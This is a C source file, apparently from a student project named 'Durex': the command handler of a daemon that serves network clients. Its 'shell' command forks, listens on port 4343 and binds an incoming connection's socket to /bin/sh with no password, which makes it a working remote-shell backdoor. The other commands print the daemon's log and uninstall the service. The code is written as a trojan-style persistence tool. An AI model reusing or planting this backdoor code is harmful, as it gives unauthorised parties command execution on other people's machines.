/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   server_command.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony </var/mail/banthony>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/14 12:51:21 by banthony          #+#    #+#             */
/*   Updated: 2019/11/21 11:09:28 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "server.h"
#include "Durex.h"

extern char **environ;

static t_bool	server_cmd_help(t_client *client, t_server *server)
{
	char *help_content =	"Durex commands:\n"
							"\t'help' or '?'\t- Show this message.\n"
							"\t'exit'\t\t- Quit Durex.\n"
							"\t'shell'\t\t- Spawn a shell on port 4343.\n"
							"\t'uninstall'\t- Uninstall Durex.\n"
							"\t'log'\t\t- Print durex log file.\n";
	if (!server || !client)
		return (false);
	send_text(help_content, client->socket);
	return (true);
}

static t_bool	server_cmd_log(t_client *client, t_server *server)
{
	int		fd;
	int		ret;
	char	buf[READ_BUFFER_SIZE];

	if (!server || !client)
		return (false);
	if ((fd = open(DUREX_LOG_FILE, O_RDONLY)) < 0)
	{
		durex_log("Can't open log file", LOG_WARNING);
		durex_log(strerror(errno), LOG_WARNING);
		send_text("Can't open log file.", client->socket);
		return (false);
	}
	while((ret = read(fd, buf, READ_BUFFER_SIZE)) > 0)
		send(client->socket, buf, ret, 0);
	close(fd);
	return (true);
}

static t_bool	server_cmd_shell(t_client *client, t_server *server)
{
	t_server	remote_shell;
	pid_t		pid;
	char		*sh[] = { "/bin/sh", NULL };
	t_client	*clt;

	if (!server || !client)
		return (false);
	if ((pid = fork()) < 0)
	{
		send_text("The remote shell has failed.\n", client->socket);
		durex_log("The remote shell has failed.", LOG_WARNING);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		ft_memset(&remote_shell, 0, sizeof(remote_shell));
		remote_shell.require_pass = false;
		close(server->socket);
		if (create_server(&remote_shell, 4343, 1))
		{
			send_text("\033[32m•\033[0m Done.\n", client->socket);
			close(client->socket);
			if (new_client(&remote_shell))
			{
				clt = (t_client*)remote_shell.client_lst->content;
				dup2(clt->socket, 0);
				dup2(clt->socket, 1);
				dup2(clt->socket, 2);
				execve(sh[0], sh, environ);
			}
		}
		send_text("\033[31m•\033[0m Failed, wait and retry.\n", client->socket);
		close(client->socket);
		durex_log("The remote shell has failed.", LOG_WARNING);
		exit(EXIT_FAILURE); // kill daemon
	}
	// Father
	else
	{
		send_text("\033[33m•\033[0m Spawning a shell on port 4343 ...\n", client->socket);
		sleep(1);
		durex_log("Mefait accomplit!", LOG_INFO);
	}
	return (true);
}

static t_bool	server_cmd_exit(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	deco_client(client, server);
	return (true);
}

static t_bool	server_cmd_uninstall(t_client *client, t_server *server)
{
	if (!server || !client)
		return (false);
	if (uninstall_service())
	{
		send_text("Uninstall durex ... \033[32m•\033[0m Done.\n", client->socket);
		durex_log("durex service has been removed from system.", LOG_WARNING);
		return (false);
	}
	send_text("Uninstall durex ... \033[31m•\033[0m Failed.\n", client->socket);
	durex_log("durex uninstall has failed.", LOG_WARNING);
	return (true);
}

static const t_cmd g_server_cmd[SERVER_CMD_NUMBER] =
{
	[HELP] = COMMAND(help),
 	[HELP_ALIAS] = {"?", server_cmd_help},
	[UNINSTALL] = COMMAND(uninstall),
	[SHELL] = COMMAND(shell),
	[LOG] = COMMAND(log),
	[EXIT] = COMMAND(exit),
};

void	server_command_handler(char *raw_cmd, size_t cmd_size, t_server *server, t_client *client)
{
	t_server_cmd cmd = -1;

	raw_cmd[cmd_size - 1] = (raw_cmd[cmd_size - 1] == '\n') ? '\0' : raw_cmd[cmd_size - 1];
	durex_log_with(raw_cmd, LOG_INFO, client_prefix, client);
	while (++cmd < SERVER_CMD_NUMBER)
	{
		if (!ft_strncmp(g_server_cmd[cmd].name, raw_cmd, cmd_size))
			g_server_cmd[cmd].func(client, server);
	}
	send_text(SERVER_PROMPT, client->socket);
}
